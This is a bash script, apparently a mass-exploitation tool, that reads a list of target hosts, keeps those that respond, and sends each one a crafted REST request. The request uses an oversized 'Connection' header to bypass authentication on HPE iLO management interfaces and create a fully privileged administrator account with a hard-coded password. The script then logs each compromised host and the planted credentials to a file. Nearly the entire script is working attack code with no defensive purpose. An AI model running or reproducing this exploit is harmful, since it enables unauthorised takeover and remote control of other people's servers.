#!/bin/bash
echo -e "\033[34m\$\$\$\$\$\$\$\   \$\$\$\$\$\$\  \$\$\             \$\$\   \$\$\          \$\$\$\$\$\$\   \$\$\$\$\$\$\             \$\$\$\$\$\$\  
\$\$  __\$\$\ \$\$\$ __\$\$\ \$\$ |            \$\$ |\$\$\$\$ |        \$\$ ___\$\$\ \$\$  __\$\$\           \$\$  __\$\$\ 
\$\$ |  \$\$ |\$\$\$\$\ \$\$ |\$\$ |  \$\$\  \$\$\$\$\$\$\$ |\_\$\$ |        \_/   \$\$ |\$\$ /  \$\$ |\$\$\$\$\$\$\$\  \$\$ /  \__|
\$\$\$\$\$\$\$\ |\$\$\\$\$\\$\$ |\$\$ | \$\$  |\$\$  __\$\$ |  \$\$ |          \$\$\$\$\$ / \$\$\$\$\$\$\$\$ |\$\$  __\$\$\ \$\$ |\$\$\$\$\ 
\$\$  __\$\$\ \$\$ \\$\$\$\$ |\$\$\$\$\$\$  / \$\$ /  \$\$ |  \$\$ |          \___\$\$\ \$\$  __\$\$ |\$\$ |  \$\$ |\$\$ |\_\$\$ |
\$\$ |  \$\$ |\$\$ |\\$\$\$ |\$\$  _\$\$<  \$\$ |  \$\$ |  \$\$ |        \$\$\   \$\$ |\$\$ |  \$\$ |\$\$ |  \$\$ |\$\$ |  \$\$ |
\$\$\$\$\$\$\$  |\\$\$\$\$\$\$  /\$\$ | \\$\$\ \\$\$\$\$\$\$\$ |\$\$\$\$\$\$\       \\$\$\$\$\$\$  |\$\$ |  \$\$ |\$\$ |  \$\$ |\\$\$\$\$\$\$  |
\_______/  \______/ \__|  \__| \_______|\______|\$\$\$\$\$\$\\______/ \__|  \__|\__|  \__| \______/ 
                                                \______|                                      
 \033[0m"                                                                                    


echo -e "\033[31mTarget address: \033[0m"
echo -e "(\033[34mPlease enter the full path of the text!\033[0m)"
read target

echo -e "\033[31mPlease enter the result output path: \033[0m"
echo -e "(\033[34mFormat: /tmp/1.txt\033[0m)"
echo -e "(\033[34mNote: If you are root be careful not to overwrite your key files!\033[0m)"
read result

echo -e "\033[31mRuning......\033[0m"
echo -e "(\033[34mNote: The results are for reference only, because the code is not optimized yet!\033[0m)"
sleep 5
for i in $(cat $target);
do
        if [ "$(curl --connect-timeout 3 -sL -k -w '%{http_code}' $i -o /dev/null )" = "200" ]
        then
                echo -e "\033[32m$i is Active!\033[0m"
#               curl -k -L -v $i/rest/v1/AccountService/Accounts -X POST -H "Accept-Encoding: gzip, deflate" -H "Accept: */*" -H "Content-Type: application/json" -H "Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" -d "%7B%22UserName%22%3A%20%22administrador%22%2C%20%22Password%22%3A%20%22XmPPhY3Cuj%22%2C%20%22Oem%22%3A%20%7B%22Hp%22%3A%20%7B%22Privileges%22%3A%20%7B%22RemoteConsolePriv%22%3A%20true%2C%20%22iLOConfigPriv%22%3A%20true%2C%20%22VirtualMediaPriv%22%3A%20true%2C%20%22UserConfigPriv%22%3A%20true%2C%20%22VirtualPowerAndResetPriv%22%3A%20true%2C%20%22LoginPriv%22%3A%20true%7D%2C%20%22LoginName%22%3A%20%22administratar%22%7D%7D%7D" --connect-timeout 3
                curl -k -L $i/rest/v1/AccountService/Accounts -X POST -H "Accept-Encoding: gzip, deflate" -H "Accept: */*" -H "Content-Type: application/json" -H "Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" -d '{"UserName": "administrador", "Password": "XmPPhY3Cuj", "Oem": {"Hp": {"Privileges": {"RemoteConsolePriv": true, "iLOConfigPriv": true, "VirtualMediaPriv": true, "UserConfigPriv": true, "VirtualPowerAndResetPriv": true, "LoginPriv": true}, "LoginName": "administratar"}}}' --connect-timeout 3 --user-agent 'Chrome/54.0 (Windows NT 10.0)'

                echo -e "\033[36m$i\033[0m" >> $result
                echo -e "\033[36mUsername: administrador\033[0m" >> $result
                echo -e "\033[36mPassword: XmPPhY3Cuj\033[0m" >> $result
                echo -e "\n" >> $result

        else
                echo -e "\033[35mDead!\033[0m"
        fi

done

echo -e "\033[36mIt\`s done!\033[0m"
echo -e "\033[36m(Check: /tmp/1.txt)\033[0m"